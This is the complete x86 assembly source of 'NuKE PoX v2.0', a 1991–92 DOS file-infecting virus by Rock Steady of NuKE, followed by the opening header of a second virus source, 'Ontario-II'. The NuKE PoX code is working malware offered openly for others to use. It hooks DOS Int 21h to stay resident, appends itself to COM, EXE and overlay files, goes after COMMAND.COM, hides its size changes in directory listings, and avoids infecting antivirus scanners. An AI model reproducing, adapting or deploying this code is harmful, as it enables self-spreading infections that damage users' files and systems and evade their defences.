;==========================================================================
;                        ** NuKE Pox v2.0 **                               
;This is VERY old code but I promised to give it out, you'll see it exactly
;like Npox v1.1 in IJ#4, The code here is VERY BADLY written, I wrote WHOLE
;procedures TWICE! so LOTS of double code, I leave it UNTOUCHED for you to 
;see, and understand it! I don't care if you fuck with it, go for it!      
;The method of TSR is old, method of getting the Vectors is bad, the way   
;I infect EXEs ain't too hot... But hell it works! It infects overlays..   
;it won't infect F-prot.exe or anything with ????SCAN.EXE like SCAN.EXE or 
;TBSCAN.EXE etc... Command.com dies fast... Really neat...Play all you like
;                                                                          
;And to all those that said I `Hacked' this...                             
; FFFFFF UU   UU   CCCC   KK  KK       YY    YY   OOOO   UU   UU           
; FF     UU   UU  CC  CC  KK KK         YY  YY   OO  OO  UU   UU           
; FFFF   UU   UU  CC      KKK      ===    YY     OO  OO  UU   UU           
; FF     UU   UU  CC  CC  KK KK           YY     OO  OO  UU   UU           
; FF      UUUUUU   CCCC   KK  KK          YY      OOOO    UUUUUU           
;Just cuz you can't do it, doesn't mean I can't, anyhow my 93 viruses are  
;500% better than this one...                                              
;*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
;-*      (c) Rock Steady, Viral Developments                             -*
;*-      (c) NuKE Software Developement  1991, 1992                      *-
;-*                                                                      -*
;*-  Virus: NuKE PoX              Version: 2.0                           *-
;-*  ~~~~~~                       ~~~~~~~~                               -*
;*-  Notes: EXE & COM & OVL Infector, TSR Virus. Dir Stealth Routine.    *-
;-*         Will Disinfect files that are opened, and re-infect them     -*
;*-         when they are closed! Executed files are disinfected then    *-
;-*         executed, and when terminated reinfected!                    -*
;*-         VERY HARD to stop, it goes for your COMMAND.COM! beware!     *-
;-*         It is listed as a COMMON Virus due to is stealthiness!       -*
;*-  Bytes: 1800 Bytes                                                   *-
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
virus_size      equ     last - init_virus       ;Virus size                
mut1            equ     3                                                  
mut2            equ     1                                                  
mut3            equ     103h                    ;Offset location           
                                                                           
seg_a          segment   byte public                                       
               assume    cs:seg_a, ds:seg_a                                
                org     100h                    ;COM file!                 
rocko           proc    far                                                
start:          jmp     init_virus                                         
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                       Virus Begins Here...                               
;------------------------------------------------------------------------- 
init_virus:     call    doit_now                ;Doit VirusMan...          
doit_now:       pop     bp                      ;Not to Lose Track         
                sub     bp,106h                 ;Set our position          
                push    ax                      ;Save all the regesters    
                push    bx                                                 
                push    cx                                                 
                push    dx                                                 
                push    si                                                 
                push    di                                                 
                push    bp                                                 
                push    es                                                 
                push    ds                                                 
                mov     ax,0abcdh               ;Are we resident Already?  
                int     21h                     ;***McAfee Scan String!    
                cmp     bx,0abcdh               ;Yupe... Quit Then...      
                je      exit_com                                           
                push    cs                      ;Get CS=DS                 
                pop     ds                                                 
                mov     cx,es                                              
                mov     ax,3521h                ;Sometimes tend to inter-  
                int     21h                     ;cept this Interrupt...    
                mov     word ptr cs:[int21+2][bp],es    ;Save the Int      
                mov     word ptr cs:[int21][bp],bx      ;Vector Table      
                dec     cx                      ;Get a new Memory block    
                mov     es,cx                   ;Put it Back to ES         
                mov     bx,es:mut1              ;Get TOM size              
                mov     dx,virus_size           ;Virus size in DX          
                mov     cl,4                    ;Shift 4 bits              
                shr     dx,cl                   ;Fast way to divide by 16  
                add     dx,4                    ;add 1 more para segment   
                mov     cx,es                   ;current MCB segment       
                sub     bx,dx                   ;sub virus_size from TOM   
                inc     cx                      ;put back right location   
                mov     es,cx                                              
                mov     ah,4ah                  ;Set_block                 
                int     21h                                                
                                                                           
                jc      exit_com                                           
                mov     ah,48h                  ;now allocate it           
                dec     dx                      ;number of para            
                mov     bx,dx                   ;                          
                int     21h                                                
                jc      exit_com                                           
                dec     ax                      ;get MCB                   
                mov     es,ax                                              
                mov     cx,8h                   ;Made DOS the owner of MCB 
                mov     es:mut2,cx              ;put it...                 
                sub     ax,0fh                  ;get TOM                   
                mov     di,mut3                 ;beginnig of our loc in mem
                mov     es,ax                   ;                          
                mov     si,bp                   ;delta pointer             
                add     si,offset init_virus    ;where to start            
                mov     cx,virus_size                                      
                cld                                                        
                repne   movsb                    ;move us                  
                                                                           
                mov     ax,2521h                ;Restore Int21 with ours   
                mov     dx,offset int21_handler ;Where it starts           
                push    es                                                 
                pop     ds                                                 
                int     21h                                                
exit_com:       push    cs                                                 
                pop     ds                                                 
                cmp     word ptr cs:[buffer][bp],5A4Dh                     
                je      exit_exe_file                                      
                mov     bx,offset buffer        ;Its a COM file restore    
                add     bx,bp                   ;First three Bytes...      
                mov     ax,[bx]                 ;Mov the Byte to AX        
                mov     word ptr ds:[100h],ax   ;First two bytes Restored  
                add     bx,2                    ;Get the next Byte         
                mov     al,[bx]                 ;Move the Byte to AL       
                mov     byte ptr ds:[102h],al   ;Restore the Last of 3b    
                pop     ds                                                 
                pop     es                                                 
                pop     bp                      ;Restore Regesters         
                pop     di                                                 
                pop     si                                                 
                pop     dx                                                 
                pop     cx                                                 
                pop     bx                                                 
                pop     ax                                                 
                mov     ax,100h                 ;Jump Back to Beginning    
                push    ax                      ;Restores our IP (a CALL   
                retn                            ;Saves them, now we changed
command         db      "C:\COMMAND.COM",0                                 
                                                                           
exit_exe_file:  mov     bx,word ptr cs:[vir_cs][bp]     ;fix segment loc   
                mov     dx,cs                           ;                  
                sub     dx,bx                                              
                mov     ax,dx                                              
                add     ax,word ptr cs:[exe_cs][bp]     ;add it to our segs
                add     dx,word ptr cs:[exe_ss][bp]                        
                mov     bx,word ptr cs:[exe_ip][bp]                        
                mov     word ptr cs:[fuck_yeah][bp],bx                     
                mov     word ptr cs:[fuck_yeah+2][bp],ax                   
                mov     ax,word ptr cs:[exe_ip][bp]                        
                mov     word ptr cs:[Rock_fix1][bp],dx                     
                mov     word ptr cs:[Rock_fix2][bp],ax                     
                pop     ds                                                 
                pop     es                                                 
                pop     bp                                                 
                pop     di                                                 
                pop     si                                                 
                pop     dx                                                 
                pop     cx                                                 
                pop     bx                                                 
                pop     ax                                                 
                db      0B8h                   ;nothing but MOV AX,XXXX    
Rock_Fix1:                                                                 
                dw      0                                                  
                cli                                                        
                mov     ss,ax                                              
                db      0BCh                   ;nothing but MOV SP,XXXX    
Rock_Fix2:                                                                 
                dw      0                                                  
                sti                                                        
                db      0EAh                    ;nothing but JMP XXXX:XXXX 
Fuck_yeah:                                                                 
                dd      0                                                  
int21           dd      ?                       ;Our Old Int21             
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                       Dir Handler                                        
;------------------------------------------------------------------------- 
old_dir:        call    calldos21               ;get FCB                   
                test    al,al                   ;error?                    
                jnz     old_out                 ;nope                      
                push    ax                                                 
                push    bx                                                 
                push    es                                                 
                mov     ah,51h                  ;get PSP                   
                int     21h                                                
                mov     es,bx                   ;                          
                cmp     bx,es:[16h]             ;                          
                jnz     not_infected                                       
                mov     bx,dx                                              
                mov     al,[bx]                                            
                push    ax                                                 
                mov     ah,2fh                                             
                int     21h                                                
                pop     ax                                                 
                inc     al                       ;Extended FCB?            
                jnz     fcb_okay                                           
                add     bx,7h                                              
fcb_okay:       mov     ax,es:[bx+17h]                                     
                and     ax,1fh                                             
                cmp     al,1eh                                             
                jnz     not_infected                                       
                and     byte ptr es:[bx+17h],0e0h       ;fix secs          
                sub     word ptr es:[bx+1dh],virus_size                    
                sbb     word ptr es:[bx+1fh],0                             
not_infected:   pop     es                                                 
                pop     bx                                                 
                pop     ax                                                 
old_out:        iret                                                       
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                       Int 21 Handler                                     
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
int21_handler:  cmp     ah,11h                                             
                je      old_dir                                            
                cmp     ah,12h                                             
                je      old_dir                                            
                cmp     ax,4b00h                ;File executed             
                je      dis_infect                                         
                cmp     ah,3dh                                             
                je      check_file                                         
                cmp     ah,3eh                                             
                je      check_file2                                        
                cmp     ax,0abcdh               ;Virus testing             
                jne     int21call                                          
                mov     bx,0abcdh                                          
int21call:      jmp     dword ptr cs:[int21]    ;Split...                  
                                                                           
check_file:     jmp     opening_file            ;Like a Charm              
check_file2:    jmp     closing_file                                       
dis_infect:     call    disinfect               ;EXE & COM okay            
dont_disinfect: push    dx                                                 
                pushf                                                      
                push    cs                                                 
                call    int21call                                          
                pop     dx                                                 
                                                                           
execute:        push    ax                                                 
                push    bx                                                 
                push    cx                                                 
                push    dx                                                 
                push    ds                                                 
                                                                           
                push    ax                                                 
                push    bx                                                 
                push    cx                                                 
                push    dx                                                 
                push    ds                                                 
                push    bp                                                 
                push    cs                                                 
                pop     ds                                                 
                mov     dx,offset command                                  
                mov     bp,0abcdh                                          
                jmp     command1                                           
command_ret:    pop     bp                                                 
                pop     ds                                                 
                pop     dx                                                 
                pop     cx                                                 
                pop     bx                                                 
                pop     ax                                                 
                call    check_4_av                                         
                jc      exit1                                              
command1:       mov     ax,4300h                ;Get file Attribs          
                call    calldos21                                          
                jc      exit1                                              
                test    cl,1h                   ;Make sure there normal    
                jz      open_file               ;Okay there are            
                and     cl,0feh                 ;Nope, Fix them...         
                mov     ax,4301h                ;Save them now             
                call    calldos21                                          
                jc      exit                                               
open_file:      mov     ax,3D02h                                           
                call    calldos21                                          
exit1:          jc      exit                                               
                mov     bx,ax                   ;BX File handler           
                mov     ax,5700h                ;Get file TIME + DATE      
                Call    calldos21                                          
                mov     al,cl                                              
                or      cl,1fh                  ;Un mask Seconds           
                dec     cx                      ;60 seconds                
                xor     al,cl                   ;Is it 60 seconds?         
                jz      exit                    ;File already infected     
                push    cs                                                 
                pop     ds                                                 
                mov     word ptr ds:[old_time],cx       ;Save Time         
                mov     word ptr ds:[old_date],dx       ;Save Date         
                mov     ah,3Fh                                             
                mov     cx,1Bh                          ;Read first 1B     
                mov     dx,offset ds:[buffer]           ;into our Buffer   
                call    calldos21                                          
                jc      exit_now                        ;Error Split       
                mov     ax,4202h                        ;Move file pointer 
                xor     cx,cx                           ;to EOF File       
                xor     dx,dx                                              
                call    calldos21                                          
                jc      exit_now                        ;Error Split       
                cmp     word ptr ds:[buffer],5A4Dh      ;Is file an EXE?   
                je      exe_infect                      ;Infect EXE file   
                mov     cx,ax                                              
                sub     cx,3                            ;Set the JMP       
                mov     word ptr ds:[jump_address+1],cx                    
                call    infect_me                       ;Infect!           
                jc      exit                                               
                mov     ah,40h                          ;Write back the    
                mov     dx,offset jump_address                             
                mov     cx,3h                                              
                call    calldos21                                          
exit_now:                                                                  
                mov     cx,word ptr ds:[old_time]       ;Restore old time  
                mov     dx,word ptr ds:[old_date]       ;Restore Old date  
                mov  ax,5701h                                              
                call    calldos21                                          
                mov     ah,3Eh                                             
                call    calldos21                                          
exit:           cmp     bp,0abcdh                                          
                je      command2                                           
                pop     ds                                                 
                pop     dx                                                 
                pop     cx                                                 
                pop     bx                                                 
                pop     ax                                                 
                iret                                                       
command2:       jmp     command_ret                                        
                                                                           
exe_infect:     mov     cx,word ptr cs:[buffer+20]                         
                mov     word ptr cs:[exe_ip],cx                            
                mov     cx,word ptr cs:[buffer+22]                         
                mov     word ptr cs:[exe_cs],cx                            
                mov     cx,word ptr cs:[buffer+16]                         
                mov     word ptr cs:[exe_sp],cx                            
                mov     cx,word ptr cs:[buffer+14]                         
                mov     word ptr cs:[exe_ss],cx                            
                push    ax                                                 
                push    dx                                                 
                call    multiply                                           
                sub     dx,word ptr cs:[buffer+8]                          
                mov     word ptr cs:[vir_cs],dx                            
                push    ax                                                 
                push    dx                                                 
                call    infect_me                                          
                pop     dx                                                 
                pop     ax                                                 
                mov     word ptr cs:[buffer+22],dx                         
                mov     word ptr cs:[buffer+20],ax                         
                pop     dx                                                 
                pop     ax                                                 
                jc      exit                                               
                add     ax,virus_size                                      
                adc     dx,0                                               
                push    ax                                                 
                push    dx                                                 
                call    multiply                                           
                sub     dx,word ptr cs:[buffer+8]                          
                add     ax,40h                                             
                mov     word ptr cs:[buffer+14],dx                         
                mov     word ptr cs:[buffer+16],ax                         
                pop     dx                                                 
                pop     ax                                                 
                push    bx                                                 
                push    cx                                                 
                mov     cl,7                                               
                shl     dx,cl                                              
                mov     bx,ax                                              
                mov     cl,9                                               
                shr     bx,cl                                              
                add     dx,bx                                              
                and     ax,1FFh                                            
                jz      outta_here                                         
                inc     dx                                                 
outta_here:     pop     cx                                                 
                pop     bx                                                 
                mov     word ptr cs:[buffer+2],ax                          
                mov     word ptr cs:[buffer+4],dx                          
                mov     ah,40h                                             
                mov     dx,offset ds:[buffer]                              
                mov     cx,20h                                             
                call    calldos21                                          
exit_exe:       jmp     exit_now                                           
rocko           endp                                                       
vir_cs          dw      0                                                  
exe_ip          dw      0                                                  
exe_cs          dw      0                                                  
exe_sp          dw      0                                                  
exe_ss          dw      0                                                  
exe_sz          dw      0                                                  
exe_rm          dw      0                                                  
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                   Opening File handle AX=3D                              
;------------------------------------------------------------------------- 
opening_file:   call    check_extension                                    
                jnc     open_fuck2                                         
                call    check_exten_exe                                    
                jnc     open_fuck2                                         
                jmp     dword ptr cs:[int21]                               
open_fuck2:     push    ax                                                 
                mov     ax,3d02h                                           
                call    calldos21                                          
                jnc     open_fuck1                                         
                pop     ax                                                 
                iret                                                       
open_fuck1:     push    bx                                                 
                push    cx                                                 
                push    dx                                                 
                push    ds                                                 
                mov     bx,ax                                              
                mov     ax,5700h                                           
                call    calldos21                                          
                mov     al,cl                                              
                or      cl,1fh                                             
                dec     cx                      ;60 Seconds                
                xor     al,cl                                              
                jnz     opening_exit3                                      
                dec     cx                                                 
                mov     word ptr cs:[old_time],cx                          
                mov     word ptr cs:[old_date],dx                          
                mov     ax,4202h                ;Yes Pointer to EOF        
                xor     cx,cx                                              
                xor     dx,dx                                              
                call    calldos21                                          
                mov     cx,dx                                              
                mov     dx,ax                                              
                push    cx                                                 
                push    dx                                                 
                sub     dx,1Bh                  ;Get first 3 Bytes         
                sbb     cx,0                                               
                mov     ax,4200h                                           
                call    calldos21                                          
                push    cs                                                 
                pop     ds                                                 
                mov     ah,3fh                  ;Read them into Buffer     
                mov     cx,1Bh                                             
                mov     dx,offset buffer                                   
                call    calldos21                                          
                xor     cx,cx                   ;Goto Beginning of File    
                xor     dx,dx                                              
                mov     ax,4200h                                           
                call    calldos21                                          
                mov     ah,40h                  ;Write first three bytes   
                mov     dx,offset buffer                                   
                mov     cx,1Bh                                             
                cmp     word ptr cs:[buffer],5A4Dh                         
                je      open_exe_jmp                                       
                mov     cx,3h                                              
open_exe_jmp:   call    calldos21                                          
                pop     dx                      ;EOF - Virus_Size          
                pop     cx                      ;to get ORIGINAL File size 
                sub     dx,virus_size                                      
                sbb     cx,0                                               
                mov     ax,4200h                                           
                call    calldos21                                          
                mov     ah,40h                  ;Fix Bytes                 
                xor     cx,cx                                              
                call    calldos21                                          
                mov     cx,word ptr cs:[old_time]                          
                mov     dx,word ptr cs:[old_date]                          
                mov     ax,5701h                                           
                int     21h                                                
                mov     ah,3eh                  ;Close File                
                call    calldos21                                          
opening_exit3:  pop     ds                                                 
                pop     dx                                                 
                pop     cx                                                 
                pop     bx                                                 
                pop     ax                                                 
                jmp     dword ptr cs:[int21]                               
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                   Closing File Handle INFECT it!                         
;------------------------------------------------------------------------- 
closing_file:   cmp     bx,0h                                              
                je      closing_bye                                        
                cmp     bx,5h                                              
                ja      close_cont                                         
closing_bye:    jmp     dword ptr cs:[int21]                               
                                                                           
close_cont:     push    ax                                                 
                push    bx                                                 
                push    cx                                                 
                push    dx                                                 
                push    di                                                 
                push    ds                                                 
                push    es                                                 
                push    bp                                                 
                push    bx                                                 
                mov     ax,1220h                                           
                int     2fh                                                
                mov     ax,1216h                                           
                mov     bl,es:[di]                                         
                int     2fh                                                
                pop     bx                                                 
                add     di,0011h                                           
                mov     byte ptr es:[di-0fh],02h                           
                add     di,0017h                                           
                cmp     word ptr es:[di],'OC'                              
                jne     closing_next_try                                   
                cmp     byte ptr es:[di+2h],'M'                            
                jne     pre_exit                                           
                jmp     closing_cunt3                                      
closing_next_try:                                                          
                cmp     word ptr es:[di],'XE'                              
                jne     pre_exit                                           
                cmp     byte ptr es:[di+2h],'E'                            
                jne     pre_exit                                           
closing_cunt:   cmp     word ptr es:[di-8],'CS'                            
                jnz     closing_cunt1              ;SCAN                   
                cmp     word ptr es:[di-6],'NA'                            
                jz      pre_exit                                           
closing_cunt1:  cmp     word ptr es:[di-8],'-F'                            
                jnz     closing_cunt2              ;F-PROT                 
                cmp     word ptr es:[di-6],'RP'                            
                jz      pre_exit                                           
closing_cunt2:  cmp     word ptr es:[di-8],'LC'                            
                jnz     closing_cunt3                                      
                cmp     word ptr es:[di-6],'AE'    ;CLEAN                  
                jnz     closing_cunt3                                      
pre_exit:       jmp     closing_nogood                                     
closing_cunt3:  mov     ax,5700h                                           
                call    calldos21                                          
                                                                           
                mov     al,cl                                              
                or      cl,1fh                                             
                dec     cx                              ;60 Seconds        
                xor     al,cl                                              
                jz      closing_nogood                                     
                push    cs                                                 
                pop     ds                                                 
                mov     word ptr ds:[old_time],cx                          
                mov     word ptr ds:[old_date],dx                          
                mov     ax,4200h                                           
                xor     cx,cx                                              
                xor     dx,dx                                              
                call    calldos21                                          
                mov     ah,3fh                                             
                mov     cx,1Bh                                             
                mov     dx,offset buffer                                   
                call    calldos21                                          
                jc      closing_no_good                                    
                mov     ax,4202h                                           
                xor     cx,cx                                              
                xor     dx,dx                                              
                call    calldos21                                          
                jc      closing_no_good                                    
                cmp     word ptr ds:[buffer],5A4Dh                         
                je      closing_exe                                        
                mov     cx,ax                                              
                sub     cx,3h                                              
                mov     word ptr ds:[jump_address+1],cx                    
                call    infect_me                                          
                jc      closing_no_good                                    
                mov     ah,40h                                             
                mov     dx,offset jump_address                             
                mov     cx,3h                                              
                call    calldos21                                          
closing_no_good:                                                           
                mov     cx,word ptr ds:[old_time]                          
                mov     dx,word ptr ds:[old_date]                          
                mov     ax,5701h                                           
                call    calldos21                                          
closing_nogood: pop     bp                                                 
                pop     es                                                 
                pop     ds                                                 
                pop     di                                                 
                pop     dx                                                 
                pop     cx                                                 
                pop     bx                                                 
                pop     ax                                                 
                jmp     dword ptr cs:[int21]                               
closing_exe:    mov     cx,word ptr cs:[buffer+20]                         
                mov     word ptr cs:[exe_ip],cx                            
                mov     cx,word ptr cs:[buffer+22]                         
                mov     word ptr cs:[exe_cs],cx                            
                mov     cx,word ptr cs:[buffer+16]                         
                mov     word ptr cs:[exe_sp],cx                            
                mov     cx,word ptr cs:[buffer+14]                         
                mov     word ptr cs:[exe_ss],cx                            
                push    ax                                                 
                push    dx                                                 
                call    multiply                                           
                sub     dx,word ptr cs:[buffer+8]                          
                mov     word ptr cs:[vir_cs],dx                            
                push    ax                                                 
                push    dx                                                 
                call    infect_me                                          
                pop     dx                                                 
                pop     ax                                                 
                mov     word ptr cs:[buffer+22],dx                         
                mov     word ptr cs:[buffer+20],ax                         
                pop     dx                                                 
                pop     ax                                                 
                jc      closing_no_good                                    
                add     ax,virus_size                                      
                adc     dx,0                                               
                push    ax                                                 
                push    dx                                                 
                call    multiply                                           
                sub     dx,word ptr cs:[buffer+8]                          
                add     ax,40h                                             
                mov     word ptr cs:[buffer+14],dx                         
                mov     word ptr cs:[buffer+16],ax                         
                pop     dx                                                 
                pop     ax                                                 
                push    bx                                                 
                push    cx                                                 
                mov     cl,7                                               
                shl     dx,cl                                              
                mov     bx,ax                                              
                mov     cl,9                                               
                shr     bx,cl                                              
                add     dx,bx                                              
                and     ax,1FFh                                            
                jz      close_split                                        
                inc     dx                                                 
close_split:    pop     cx                                                 
                pop     bx                                                 
                mov     word ptr cs:[buffer+2],ax                          
                mov     word ptr cs:[buffer+4],dx                          
                mov     ah,40h                                             
                mov     dx,offset ds:[buffer]                              
                mov     cx,20h                                             
                call    calldos21                                          
closing_over:   jmp     closing_no_good                                    
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                   Infection Routine...                                   
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
infect_me       proc                                                       
                mov     ah,40h                                             
                mov     dx,offset init_virus                               
                mov     cx,virus_size                                      
                call    calldos21                                          
                jc      exit_error                      ;Error Split       
                mov     ax,4200h                                           
                xor     cx,cx                           ;Pointer back to   
                xor     dx,dx                           ;top of file       
                call    calldos21                                          
                jc      exit_error                      ;Split Dude...     
                clc                                     ;Clear carry flag  
                ret                                                        
exit_error:                                                                
                stc                                     ;Set carry flag    
                ret                                                        
infect_me       endp                                                       
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;               DisInfection Routine for 4B                                
;------------------------------------------------------------------------- 
Disinfect       PROC                                                       
                push    ax                                                 
                push    bx                      ;Save them                 
                push    cx                                                 
                push    dx                                                 
                push    ds                                                 
                mov     ax,4300h                ;Get file Attribs          
                call    calldos21                                          
                test    cl,1h                   ;Test for Normal Attribs   
                jz      okay_dis                ;Yes, File can be opened   
                and     cl,0feh                 ;No, Set them to Normal    
                mov     ax,4301h                ;Save attribs to file      
                call    calldos21                                          
                jc      half_way                                           
okay_dis:       mov     ax,3d02h                ;File now can be opened    
                call    calldos21               ;Safely                    
                jc      half_way                                           
                mov     bx,ax                   ;Put File Handle in BX     
                mov     ax,5700h                ;Get File Time & Date      
                call    calldos21                                          
                mov     al,cl                   ;Check to see if infected  
                or      cl,1fh                  ;Unmask Seconds            
                dec     cx                      ;Test to see if 60 seconds 
                xor     al,cl                                              
                jnz     half_way                ;No, Quit File AIN'T       
                dec     cx                                                 
                mov     word ptr cs:[old_time],cx                          
                mov     word ptr cs:[old_date],dx                          
                mov     ax,4202h                ;Yes, file is infected     
                xor     cx,cx                   ;Goto the End of File      
                xor     dx,dx                                              
                call    calldos21                                          
                push    cs                                                 
                pop     ds                                                 
                mov     cx,dx                   ;Save Location into        
                mov     dx,ax                   ;CX:DX                     
                push    cx                      ;Push them for later use   
                push    dx                                                 
                sub     dx,1Bh                  ;Subtract file 1Bh from the
                sbb     cx,0                    ;End so you will find the  
                mov     ax,4200h                ;Original EXE header or    
                call    calldos21               ;First 3 bytes for COMs    
                mov     ah,3fh                  ;Read them into Buffer     
                mov     cx,1Bh                  ;Read all of the 1B bytes  
                mov     dx,offset buffer        ;Put them into our buffer  
                call    calldos21                                          
                jmp     half                                               
half_way:       jmp     end_dis                                            
half:           xor     cx,cx                   ;                          
                xor     dx,dx                   ;Goto the BEGINNING of file
                mov     ax,4200h                                           
                call    calldos21                                          
                mov     ah,40h                  ;Write first three bytes   
                mov     dx,offset buffer        ;from buffer to COM        
                mov     cx,1Bh                                             
                cmp     word ptr cs:[buffer],5A4Dh                         
                je      dis_exe_jmp                                        
                mov     cx,3h                                              
dis_exe_jmp:    call    calldos21                                          
                pop     dx                      ;Restore CX:DX which they  
                pop     cx                      ;to the End of FILE        
                sub     dx,virus_size           ;Remove Virus From the END 
                sbb     cx,0                    ;of the Orignal File       
                mov     ax,4200h                ;Get new EOF               
                call    calldos21                                          
                mov     ah,40h                  ;Write new EOF to File     
                xor     cx,cx                                              
                call    calldos21                                          
                mov     cx,word ptr cs:[old_time]                          
                mov     dx,word ptr cs:[old_date]                          
                mov     ax,5701h                                           
                call    calldos21                                          
                mov     ah,3eh                  ;Close File                
                call    calldos21                                          
end_dis:        pop     ds                                                 
                pop     dx                                                 
                pop     cx                      ;Restore 'em               
                pop     bx                                                 
                pop     ax                                                 
                ret                                                        
disinfect       ENDP                                                       
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;               Check File Extension DS:DX ASCIIZ                          
;--------------------------------------------------------------------------
Check_extension         PROC                                               
                push    si                                                 
                push    cx                                                 
                mov     si,dx                                              
                mov     cx,256h                                            
loop_me:        cmp     byte ptr ds:[si],2eh                               
                je      next_ok                                            
                inc     si                                                 
                loop    loop_me                                            
next_ok:        cmp     word ptr ds:[si+1],'OC'                            
                jne     next_1                                             
                cmp     byte ptr ds:[si+3],'M'                             
                je      good_file                                          
next_1:         cmp     word ptr ds:[si+1],'oc'                            
                jne     next_2                                             
                cmp     byte ptr ds:[si+3],'m'                             
                je      good_file                                          
next_2:         pop     cx                                                 
                pop     si                                                 
                stc                                                        
                ret                                                        
good_file:      pop     cx                                                 
                pop     si                                                 
                clc                                                        
                ret                                                        
Check_extension         ENDP                                               
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;               Check File Extension DS:DX ASCIIZ                          
;------------------------------------------------------------------------- 
Check_exten_exe         PROC                                               
                push    si                                                 
                push    cx                                                 
                mov     si,dx                                              
                mov     cx,256h                                            
loop_me_exe:    cmp     byte ptr ds:[si],2eh                               
                je      next_ok_exe                                        
                inc     si                                                 
                loop    loop_me_exe                                        
next_ok_exe:    cmp     word ptr ds:[si+1],'XE'                            
                jne     next_1_exe                                         
                cmp     byte ptr ds:[si+3],'E'                             
                je      good_file_exe                                      
next_1_exe:     cmp     word ptr ds:[si+1],'xe'                            
                jne     next_2_exe                                         
                cmp     byte ptr ds:[si+3],'e'                             
                je      good_file_exe                                      
next_2_exe:     pop     cx                                                 
                pop     si                                                 
                stc                                                        
                ret                                                        
good_file_exe:  pop     cx                                                 
                pop     si                                                 
                clc                                                        
                ret                                                        
Check_exten_exe         ENDP                                               
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                    Call Int_21h Okay                                     
;------------------------------------------------------------------------- 
calldos21        PROC                                                      
                pushf                                                      
                call    dword ptr cs:[int21]                               
                retn                                                       
calldos21        ENDP                                                      
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                    MultiPly                                              
;--------------------------------------------------------------------------
multiply         PROC                                                      
                push    bx                                                 
                push    cx                                                 
                mov     cl,0Ch                                             
                shl     dx,cl                                              
                xchg    bx,ax                                              
                mov     cl,4                                               
                shr     bx,cl                                              
                and     ax,0Fh                                             
                add     dx,bx                                              
                pop     cx                                                 
                pop     bx                                                 
                retn                                                       
multiply         ENDP                                                      
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;               Check for AV file... Like SCAN.EXE or F-PROT.EXE           
;------------------------------------------------------------------------- 
Check_4_av              PROC                                               
                push    si                                                 
                push    cx                                                 
                mov     si,dx                                              
                mov     cx,256h                                            
av:             cmp     byte ptr ds:[si],2eh                               
                je      av1                                                
                inc     si                                                 
                loop    av                                                 
av1:            cmp     word ptr ds:[si-2],'NA'                            
                jnz     av2                                                
                cmp     word ptr ds:[si-4],'CS'                            
                jz      fuck_av                                            
av2:            cmp     word ptr ds:[si-2],'NA'                            
                jnz     av3                                                
                cmp     word ptr ds:[si-4],'EL'                            
                jz      fuck_av                                            
av3:            cmp     word ptr ds:[si-2],'TO'                            
                jnz     not_av                                             
                cmp     word ptr ds:[si-4],'RP'                            
                jz      fuck_av                                            
not_av:         pop     cx                                                 
                pop     si                                                 
                clc                                                        
                ret                                                        
fuck_av:        pop     cx                                                 
                pop     si                                                 
                stc                                                        
                ret                                                        
Check_4_av              ENDP                                               
msg             db      "NuKE PoX V2.0 - Rock Steady"                      
old_time        dw      0                                                  
old_date        dw      0                                                  
file_handle     dw      0                                                  
jump_address    db      0E9h,90h,90h                                       
buffer          db      90h,0CDh,020h           ;\                         
                db      18h DUP (00)            ;-Make 1Bh Bytes           
last:                                                                      
seg_a           ends                                                       
          end  start                                                       
;==========================================================================
;========================================================================= 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
; 1024-SRC Virus (Ontario-II) by Death Angel                               
; ========                                                                 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
;                                                                          
;This VIRUS was only written as an experiment to see how far a computer    
;virus could go through development. This pariticular virus in its present 
;form WILL NOT do any damage to your data or go off bouncing a ball across 
;your screen or play Yankee Doddle, IT WILL ONLY infect programs.          
;                                                                          
; Virus Information:                                                       
;    Hides:   In upper RAM, requires 3K of memory.                         
;     Size:   1K (exactly when attached to either EXE or COM files)        
;       ID:   Seconds in date of file is set to 32 (impossible value)      
;             .COM files, the 4th byte is 'O'                              
;             .EXE files, the stack pointer is 0600h                       
